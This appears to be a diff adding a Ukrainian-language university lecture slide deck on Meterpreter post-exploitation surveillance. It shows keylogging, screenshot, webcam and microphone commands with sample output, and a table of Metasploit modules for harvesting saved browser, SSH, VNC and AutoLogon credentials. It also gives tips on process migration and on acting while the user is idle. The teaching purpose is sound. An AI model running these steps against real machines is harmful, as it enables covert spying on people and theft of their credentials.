@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 9.5 — Кейлоггінг, скріншоти та спостереження</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="9">
+  <div class="slide-deck">
+
+    <section class="slide active title-slide">
+      <h1>Кейлоггінг, скріншоти та спостереження</h1>
+      <div class="subtitle">Тема 9.5 — Пост-експлуатація та Meterpreter</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Можливості спостереження Meterpreter</h2>
+
+      <div class="three-col-grid" style="margin-top: 1rem;">
+        <div class="card-red">
+          <h3>Кейлоггінг (T1056.001)</h3>
+          <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+meterpreter&gt; keyscan_start
+Starting keystroke sniffer...
+
+meterpreter&gt; keyscan_dump
+admin &lt;Tab&gt; P@ssw0rd123
+&lt;Return&gt;
+
+meterpreter&gt; keyscan_stop
+          </div>
+          <p style="font-size: 0.8em; margin-top: 0.5rem;">Перехоплення натискань у процесі, до якого прив'язана сесія</p>
+        </div>
+
+        <div class="card-purple">
+          <h3>Скріншоти (T1113)</h3>
+          <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+meterpreter&gt; screenshot
+Saved to: /tmp/screen.jpg
+
+# Потоковий (кожні 5 сек)
+meterpreter&gt; run
+  post/multi/gather/
+  screen_spy
+  DELAY=5 COUNT=20
+          </div>
+          <p style="font-size: 0.8em; margin-top: 0.5rem;">Знімок робочого столу жертви</p>
+        </div>
+
+        <div class="card-blue">
+          <h3>Веб-камера / Мікрофон</h3>
+          <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+meterpreter&gt; webcam_list
+1: Integrated Webcam
+
+meterpreter&gt; webcam_snap
+Saved: webcam_snap.jpg
+
+meterpreter&gt; record_mic
+  -d 30
+Saved: audio.wav
+          </div>
+          <p style="font-size: 0.8em; margin-top: 0.5rem;">Фото та запис аудіо</p>
+        </div>
+      </div>
+
+      <div class="warning-box" style="margin-top: 1.5rem;">
+        <strong>Для кейлоггінгу:</strong> мігруйте в <code>explorer.exe</code> цільового користувача. Кейлоггер перехоплює натискання лише в процесі, до якого прив'язана сесія.
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Збір збережених паролів з браузерів</h2>
+
+      <table class="comparison-table" style="font-size: 0.82em; margin-top: 1rem;">
+        <thead>
+          <tr><th>Модуль</th><th>Джерело</th><th>ATT&CK</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>post/windows/gather/enum_chrome</code></td><td class="cell-blue">Google Chrome</td><td>T1555.003</td></tr>
+          <tr><td><code>post/multi/gather/firefox_creds</code></td><td class="cell-yellow">Mozilla Firefox</td><td>T1555.003</td></tr>
+          <tr><td><code>post/windows/gather/enum_ie</code></td><td class="cell-blue">Internet Explorer</td><td>T1555.003</td></tr>
+          <tr><td><code>post/windows/gather/enum_putty_saved_sessions</code></td><td class="cell-green">PuTTY (SSH)</td><td>T1552.001</td></tr>
+          <tr><td><code>post/windows/gather/credentials/windows_autologin</code></td><td class="cell-red">Windows AutoLogon</td><td>T1552.001</td></tr>
+          <tr><td><code>post/windows/gather/credentials/vnc</code></td><td class="cell-yellow">VNC</td><td>T1552.001</td></tr>
+        </tbody>
+      </table>
+
+      <div class="success-box" style="margin-top: 1.5rem;">
+        <strong>Додатково:</strong> <code>screenshare</code> — real-time перегляд робочого столу через браузер. <code>idletime</code> — час неактивності (ідеально для дій, коли користувач відсутній).
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
